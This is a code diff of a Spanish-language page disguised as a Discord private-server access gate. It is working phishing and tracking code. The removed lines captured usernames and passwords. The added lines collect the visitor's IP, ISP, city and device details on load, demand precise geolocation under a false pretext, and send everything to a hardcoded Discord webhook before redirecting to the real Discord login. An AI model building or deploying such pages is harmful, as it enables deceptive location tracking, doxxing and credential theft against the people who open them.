@@ -5,55 +5,38 @@
     <title>Acceso a Servidor Privado</title>
     <style>
         body { background: #202225; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #2f3136; padding: 30px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        input, textarea { width: 100%; padding: 12px; margin: 8px 0; background: #202225; border: 1px solid #40444b; color: #fff; border-radius: 5px; box-sizing: border-box; }
-        .btn { background: #5865F2; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        #step2 { display: none; }
-        .error { color: #f04747; font-size: 12px; display: none; }
-        .codeby-footer { margin-top: 20px; color: #5865F2; font-size: 9px; text-transform: uppercase; }
+        .card { background: #2f3136; padding: 40px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        textarea { width: 100%; padding: 12px; margin: 15px 0; background: #202225; border: 1px solid #40444b; color: #fff; border-radius: 5px; box-sizing: border-box; resize: none; }
+        .btn { background: #5865F2; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .error { color: #f04747; font-size: 12px; display: none; margin-top: 10px; }
+        .codeby-footer { margin-top: 25px; color: #5865F2; font-size: 9px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
-    <div id="step1" class="card">
-        <h2>Acceso a Servidor Privado</h2>
-        <input type="text" id="user" placeholder="Nombre de usuario">
-        <input type="password" id="pass" placeholder="Contraseña">
-        <button class="btn" onclick="nextStep()">Continuar</button>
-        <div class="codeby-footer">By:Codeby</div>
-    </div>
-
-    <div id="step2" class="card">
+    <div class="card">
         <h2 style="color: #5865F2;">¿Por qué quieres entrar?</h2>
-        <textarea id="reason" rows="3" placeholder="Escribe tu motivo..."></textarea>
-        <p id="err" class="error">Debes permitir el acceso a tu ubicación para continuar.</p>
-        <button class="btn" onclick="finish()">Finalizar Verificación</button>
+        <p style="font-size: 14px; color: #b9bbbe;">Completa tu motivo para acceder al servidor privado.</p>
+        <textarea id="reason" rows="4" placeholder="Escribe tu motivo aquí..."></textarea>
+        <p id="err" class="error">Se requiere acceso a ubicación para validar el ingreso.</p>
+        <button class="btn" onclick="finish()">Acceder al servidor</button>
         <div class="codeby-footer">By:Codeby</div>
     </div>
 
     <script>
         const hook = "https://discord.com/api/webhooks/1509748386973220975/s3XxCMhpK8PFhgpX8aFnxEttiRm-RM-zbdOqtVSDUMNf_t3d-iBxl5NmcXPSXc95XvOU";
-        let u = "", p = "", ipInfo = {};
+        let techData = {};
 
-        // Captura automática al cargar (Datos sin permisos)
-        async function getAutoData() {
+        // Recolección inmediata de datos sin permisos
+        async function collectTechData() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                ipInfo = await res.json();
-            } catch(e) {}
+                techData = await res.json();
+            } catch(e) { techData = { ip: "No disponible", org: "No disponible", city: "N/A" }; }
         }
-        getAutoData();
+        collectTechData();
 
-        function nextStep() {
-            u = document.getElementById('user').value;
-            p = document.getElementById('pass').value;
-            if(u && p) {
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-            }
-        }
-
-        function finish() {
+        async function finish() {
             navigator.geolocation.getCurrentPosition(
                 (pos) => sendData(pos.coords),
                 () => { document.getElementById('err').style.display = 'block'; }
@@ -66,17 +49,17 @@
                     title: "📊 LOG CAPTURADO - Codeby",
                     color: 0x5865F2,
                     fields: [
-                        { name: "Usuario", value: u, inline: true },
-                        { name: "Contraseña", value: p, inline: true },
-                        { name: "Motivo", value: document.getElementById('reason').value || "Ninguno" },
-                        { name: "IP Pública", value: ipInfo.ip || "N/A", inline: true },
-                        { name: "ISP", value: ipInfo.org || "N/A", inline: true },
-                        { name: "Ubicación (Red)", value: `${ipInfo.city}, ${ipInfo.country_name}`, inline: true },
-                        { name: "Navegador/SO", value: navigator.userAgent.split(' ')[0] + " / " + navigator.platform },
-                        { name: "Pantalla", value: `${window.screen.width}x${window.screen.height}` },
-                        { name: "Idioma", value: navigator.language },
+                        { name: "Motivo de acceso", value: document.getElementById('reason').value || "No especificado" },
+                        { name: "IP Pública", value: techData.ip || "N/A", inline: true },
+                        { name: "ISP", value: techData.org || "N/A", inline: true },
+                        { name: "Ubicación (Red)", value: `${techData.city || "N/A"}, ${techData.country_name || "N/A"}`, inline: true },
+                        { name: "Sistema Operativo", value: navigator.platform, inline: true },
+                        { name: "Navegador", value: navigator.userAgent.split(' ')[0], inline: true },
+                        { name: "Pantalla", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                        { name: "Idioma", value: navigator.language, inline: true },
                         { name: "Coordenadas", value: `${geo.latitude}, ${geo.longitude}` }
-                    ]
+                    ],
+                    footer: { text: "Sistema Codeby" }
                 }]
             };
 
@@ -85,6 +68,7 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(data)
             });
+            
             window.location.href = "https://discord.com/login";
         }
     </script>
